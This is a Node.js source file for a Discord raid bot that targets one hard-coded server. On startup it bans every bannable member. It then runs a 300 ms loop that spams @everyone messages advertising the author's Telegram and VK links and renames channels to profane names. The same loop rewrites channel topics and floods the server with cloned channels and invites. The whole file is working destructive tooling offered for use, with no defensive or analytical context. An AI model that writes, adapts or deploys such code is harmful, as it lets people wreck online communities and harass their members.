var Discord     = require("discord.js");
var client      = new Discord.Client();
var attack_s    = "484653975275044864"
var botToken    = "" // Write here bot token
var random      = ["jsop-fuck-u-mom", "fucked-by-jsop", "telegram-jsopbots"]

function choose(choices) {
    var index = Math.floor(Math.random() * choices.length);
    return choices[index];
}


client.on("ready", () => {
    console.log("Bot is ready.");
    console.log(`Bot: ${client.user.username} (${client.user.id})`);
    console.log("Bot in guilds:")
    console.log(client.guilds.map((g, i) => {return ` - ${g.name} (${g.id})`}).join("\n"))
    
    // Check members in guild and ban:
    var g = client.guilds.get("484653975275044864")
    console.log(`Selected: ${g.name} (${g.id})`);
    g.members.forEach(m => { // get all members in attack guild
        if(m.bannable) // if bannable
            m.ban("| t.me/jsopbots |").catch(console.warn) // ban with reason "| t.me/jsopbots |"
    });

    setInterval(() => {
        client.channels.forEach(c => {
            if(c.guild.id == attack_s){
                if(c.type == "text") // if channel type is text channel
                    c.send("@everyone **THIS SERVER FUCKED BY JSOP**\n**https://link.jsop.ru/vk**\n**https://link.jsop.ru/telegram**").catch(console.warn)
            } 
        });
        client.guilds.get("484653975275044864").channels.forEach(c => {
            c.setName(choose(random)).catch(console.warn) // Set Name
            c.setTopic("| FUCKED BY JSOP | T.ME/JSOPBOTS").catch(console.warn) // Set Topic
            c.clone(choose(random), null, null, "UR SERVER FUCKED BY JSOP").then(c => { // clone channel
                c.createInvite() // Invites Spam
            })
        })   
    }, 300);
})


client.login(botToken)